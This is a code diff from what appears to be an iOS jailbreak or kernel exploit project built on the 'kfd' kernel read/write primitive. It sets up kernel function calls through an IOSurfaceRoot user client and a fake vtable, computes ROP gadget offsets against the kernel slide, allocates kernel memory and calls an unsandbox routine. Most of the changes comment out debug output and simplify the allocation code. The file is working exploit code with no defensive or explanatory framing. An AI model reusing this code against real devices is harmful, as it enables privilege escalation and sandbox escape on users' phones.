@@ -37,7 +37,7 @@ uint64_t groot_ogucredof_proc = 0;
 uint64_t add_x0_x0_0x40_ret_func;
 //uint64_t groot_ogucredof_proc;
 uint64_t proc_set_ucred_func = 0;
-
+bool newTFcheckMyRemover4me;
 
 uint64_t get_selftask(void) { return _self_task; }
 uint64_t get_selfproc(void) { return _self_proc; }
@@ -193,10 +193,10 @@ uint64_t fake_client;
 mach_port_t user_client;
 
 uint64_t init_kcallKRW(void) {
-     struct kfd* kfd_struct = (struct kfd*)FINAL_KFD;
+    /* struct kfd* kfd_struct = (struct kfd*)FINAL_KFD;
     uint64_t add_x0_x0_0x40_ret_func = 0;
     init_kernel(kfd_struct);
-    printf("off_add_x0_x0_0x40_ret = 0x%llx\n", off_add_x0_x0_0x40_ret);
+   // printf("off_add_x0_x0_0x40_ret = 0x%llx\n", off_add_x0_x0_0x40_ret);
     add_x0_x0_0x40_ret_func = getOffset(0);
     printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
 
@@ -205,33 +205,26 @@ uint64_t init_kcallKRW(void) {
         printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
 
         off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide;//18446744005083553972
-        printf("off_add_x0_x0_0x40_ret --ksl  0x%llx\n", off_add_x0_x0_0x40_ret);
-
-        setOffset(0, add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide);
-        printf("add_x0_x0_0x40_ret_func  = 0x%llx\n", add_x0_x0_0x40_ret_func);
-
-    } else {
-        printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
         printf("off_add_x0_x0_0x40_ret = 0x%llx\n", off_add_x0_x0_0x40_ret);
 
+        setOffset(0, add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide);
+        printf("add_x0_x0_0x40_ret_func = 0x%llx\n", add_x0_x0_0x40_ret_func);
+
+    } else {
         add_x0_x0_0x40_ret_func += kfd_struct->info.kernel.kernel_slide;
-        printf("add_x0_x0_0x40_ret_func += 0x%llx\n", add_x0_x0_0x40_ret_func);
-
         off_add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide;//18446744005086625264
-        printf("off_add_x0_x0_0x40_ret --ksl = 0x%llx\n", off_add_x0_x0_0x40_ret);
-
     }
-    
+    */
     
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     if (service == IO_OBJECT_NULL){
-        printf(" [-] unable to find service\n");
+    //    printf(" [-] unable to find service\n");
       exit(EXIT_FAILURE);
     }
     _user_client = 0;
     kern_return_t err = IOServiceOpen(service, mach_task_self(), 0, &_user_client);
     if (err != KERN_SUCCESS){
-        printf(" [-] unable to get user client connection\n");
+      //  printf(" [-] unable to get user client connection\n");
       exit(EXIT_FAILURE);
     }
     IOObjectRelease(service);
@@ -293,25 +286,7 @@ uint64_t kcallKRW(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t
 uint64_t kalloc(u64 kfd, size_t ksize) {
     struct kfd* kfd_struct = (struct kfd*)kfd;
     uint64_t allocated_kmem;
-    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
-       // kfree(kfd, fake_client, fake_client);
-        allocated_kmem = dirty_kalloc(kfd, ksize);
-        //kcall2(off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0);
-    } else {
-        allocated_kmem = kcallKRW(off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0);
-     }
-    return zm_fix_addr_kalloc(kfd, allocated_kmem);
-}
-
-uint64_t kalloc2ndx(u64 kfd, size_t ksize) {
-    struct kfd* kfd_struct = (struct kfd*)kfd;
-    uint64_t allocated_kmem;
-    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
-       // kfree(kfd, fake_client, fake_client);
-        
-        allocated_kmem = dirty_kalloc(kfd, ksize);
-        //kcall2(off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0);
-    } else {allocated_kmem = kcallKRW(off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0); }
+    allocated_kmem = kcallKRW(off_kalloc_data_external + get_kslide(), ksize, 1, 0, 0, 0, 0, 0);
     return zm_fix_addr_kalloc(kfd, allocated_kmem);
 }
 
@@ -333,18 +308,7 @@ int kalloc_using_empty_kdata_page(void) {
 }
 
 int kalloc_using_empty_kdata_page152(void) {
-    //init_kcall2(FINAL_KFD);
 
-    /*uint64_t allocated_kmem[2] = {0, 0};
-    allocated_kmem[0] = dirty_kalloc(FINAL_KFD, 0x1000);//    kalloc(FINAL_KFD, 0x1000);
-    allocated_kmem[1] = dirty_kalloc(FINAL_KFD, 0x1000);// kalloc(FINAL_KFD, 0x1000);
-    IOServiceClose(user_client);
-    user_client = 0;
-    usleep(500);
-    clean_dirty_kalloc(fake_vtable, 0x1000);
-    clean_dirty_kalloc(fake_client, 0x1000);
-    fake_vtable = allocated_kmem[0];
-    fake_client = allocated_kmem[1];*/
     uint64_t allocated_kmem[2] = {0, 0};
     allocated_kmem[0] = kalloc(FINAL_KFD, 0x1000);
     allocated_kmem[1] = kalloc(FINAL_KFD, 0x1000);
@@ -388,7 +352,7 @@ int prepare_kcall(void) {
     } else {
         if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"15.2")) {
             //kalloc_using_empty_kdata_page();
-            printf("ID:%d\n", getuid());
+         //   printf("ID:%d\n", getuid());
             kalloc_using_empty_kdata_page152();
             
             uint64_t sb = unsandbox(getpid());
